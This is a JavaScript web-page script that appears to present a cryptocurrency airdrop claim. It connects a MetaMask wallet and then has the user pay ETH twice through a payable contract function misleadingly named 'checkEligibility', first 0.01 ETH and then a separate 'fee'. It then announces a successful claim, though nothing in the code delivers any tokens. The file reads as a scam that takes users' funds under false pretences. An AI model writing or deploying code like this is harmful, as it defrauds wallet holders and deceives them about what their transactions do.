let provider;
let signer;
let contract;
const contractAddress = "0x9EBAE9B5b3cf3E39ac371Ff2b8FF769B2C3C1A9A";
const contractABI = [
    {
        "inputs": [],
        "name": "checkEligibility",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "fee",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            {
                "internalType": "address payable",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

document.getElementById("connectButton").onclick = async () => {
    if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        contract = new ethers.Contract(contractAddress, contractABI, signer);
        document.getElementById("claimButton").disabled = false;
        console.log("Wallet Connected");
    } else {
        alert("Please install MetaMask to interact with this site.");
    }
};

document.getElementById("claimButton").onclick = async () => {
    try {
        await contract.checkEligibility({ value: ethers.utils.parseEther("0.01") });
        const fee = await contract.fee();
        alert(`The airdrop fee is: ${ethers.utils.formatEther(fee)} ETH`);
        const recipient = await contract.recipient();
        console.log("Recipient Address:", recipient);
        const tx = await contract.checkEligibility({ value: fee });
        console.log("Transaction Hash:", tx.hash);
        alert("Airdrop Claimed Successfully!");
    } catch (error) {
        console.error(error);
        alert("Error claiming airdrop");
    }
};
